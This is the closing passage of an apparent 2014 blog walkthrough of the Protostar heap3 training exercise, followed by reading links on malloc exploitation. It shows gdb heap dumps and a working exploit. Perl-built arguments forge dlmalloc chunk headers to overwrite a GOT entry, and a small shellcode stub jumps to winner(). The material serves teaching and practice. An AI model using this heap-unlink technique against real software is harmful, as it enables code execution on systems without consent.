class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;CCCC&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x1c\xb1\x04\x08</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x08\xc0\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c008</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c000</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0xcccccccc</span>      <span class="mh">0xcccccccc</span>
<span class="mh">0x804c010</span><span class="o">:</span>      <span class="mh">0xcccccccc</span>      <span class="mh">0xcccccccc</span>      <span class="mh">0xcccccccc</span>      <span class="mh">0xcccccccc</span>
<span class="mh">0x804c020</span><span class="o">:</span>      <span class="mh">0xcccccccc</span>      <span class="mh">0xcccccccc</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c030</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c028</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000029</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>
<span class="mh">0x804c038</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0x01010101</span>      <span class="mh">0xffffffff</span>
<span class="mh">0x804c048</span><span class="o">:</span>      <span class="mh">0x42424242</span>      <span class="mh">0x42424242</span>      <span class="mh">0xfffffffc</span>      <span class="mh">0xfffffff0</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">x</span> <span class="mh">0x0804c058</span><span class="o">-</span><span class="mi">8</span>
<span class="mh">0x804c050</span><span class="o">:</span>      <span class="mh">0xfffffffc</span>      <span class="mh">0xfffffff0</span>      <span class="mh">0x43434343</span>      <span class="mh">0x0804b11c</span>
<span class="mh">0x804c060</span><span class="o">:</span>      <span class="mh">0x0804c008</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
<span class="mh">0x804c070</span><span class="o">:</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000f89</span>
</code></pre></div>


<h2 id="exploitation">Exploitation</h2>

<p>Now the heap is ready and execution stops at 0x804c008.
Let&rsquo;s adjust our code to execute winner().</p>

<p>We need to jump over the invalid bytes at 0x0804c010.
A short jump \xeb get&rsquo;s us where we want.
Then, we can push our destination address and finally return to finish this exercise.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;AAAA&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xeb\x06</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="n">x6</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x68</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x64\x88\x04\x08</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xc3</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;B&quot;</span><span class="n">x16</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="n">x4</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xff</span><span class="s">&quot;</span><span class="n">x4</span> <span class="p">.</span><span class="s">&quot;B&quot;</span><span class="n">x8</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xfc\xff\xff\xff</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\xf0\xff\xff\xff</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;CCCC&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x1c\xb1\x04\x08</span><span class="s">&quot;</span> <span class="p">.</span><span class="s">&quot;</span><span class="se">\x08\xc0\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span>
<span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1414895218</span>

<span class="n">Program</span> <span class="n">exited</span> <span class="n">with</span> <span class="n">code</span> <span class="mf">056.</span>
</code></pre></div>


<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-heap/">TheSprawl - protostar - heap levels</a></li>
</ul>

<h2 id="heap-exploitation">Heap Exploitation</h2>

<ul>
<li><a href="http://www.phrack.org/issues/57/8.html#article">Phrack 0x39, Phile #0x08 - Vudo malloc tricks</a></li>
<li><a href="http://www.phrack.org/issues/57/9.html#article">Phrack 0x39, Phile #0x09 - Once upon a free()</a></li>
<li><a href="http://phrack.org/issues/61/6.html#article">Advanced Doug lea&rsquo;s malloc exploits</a></li>
<li><a href="http://www.cgsecurity.org/exploit/heaptut.txt">w00w00 on Heap Overflows</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf">Understanding the heap by breaking it</a></li>
</ul>

<h2 id="other">Other</h2>

<ul>
<li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html">Doug Lea&rsquo;s Malloc</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Final-levels/"> Exploit Exercises - Protostar - Final levels</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/09/Exploit-Exercises---Protostar---Network-levels/"> Exploit Exercises - Protostar - Network levels</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; . All rights reserved. </p>
    </footer>

  
  

  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>

  <script src="/js/bootstrap.min.js"></script>
  <script src="/js/bootstrap.js"></script>
  <script type="text/javascript" src="/js/hc.js"></script>

  
  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>

  

</footer>


	</body>
</html>
